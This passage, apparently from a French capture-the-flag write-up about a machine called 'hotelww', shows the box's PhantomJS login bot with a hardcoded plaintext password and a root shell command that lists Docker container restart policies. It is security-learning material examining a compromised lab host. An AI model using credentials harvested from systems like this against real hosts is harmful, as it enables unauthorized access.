        console.log('CONSOLE: ' + msg + ' (from line #' + lineNum + ' in "' + sourceId + '")');
    };
    page.evaluate(function() {
        document.getElementById("username").value = "user";
        document.getElementById("password").value = "fjswkr7tlo@hJTsGnDfgFGJ";
        document.getElementById("submit").click();
        // page is redirecting.
    });

    setTimeout(function () {
        page.evaluate(function () {
            console.log('login');
        });
        //page.render("login.png");

        var url = "http://192.168.1.124";

        page.open(url, function (status) {
            setTimeout(function () {

                page.evaluate(function () {

//  page.render("logs.png");
                    console.log('mofo');
                });

                phantom.exit();
            }, 5000);
        });
    }, 5000);
});
```

On voit l'utilisation d'un browser headless PhantomJS (déprécié mais il suffit pour faire le job).  

Comment ça se lance tout ça ? On ne trouvera pas de script d'init des différents containers. En fait chaque container dispose d'une propriété de *RestartPolicy* qui indique comment le service Docker traite chaque container.  

```plain
root@hotelww:/etc# docker ps|grep -v CON|awk '{print $1}'|while read line; do  docker inspect -f "{{ .HostConfig.RestartPolicy.Name }}" $line |xargs echo $line ;done
27621f70edca unless-stopped
ad38409077c4 unless-stopped
cc12d63f25ef unless-stopped
70b3e0c40034 unless-stopped
```

Docker se charge ici de lancer (et relancer en cas de crash) tous les containers. Cette information ne peut se voir qu'avec la ligne de commande docker, le service Docker gérant ses containers à sa manière (les informations doivent être gardées dans un format trop compliqué pour le commun des mortels).

*Published December 11 2021 at 23:11*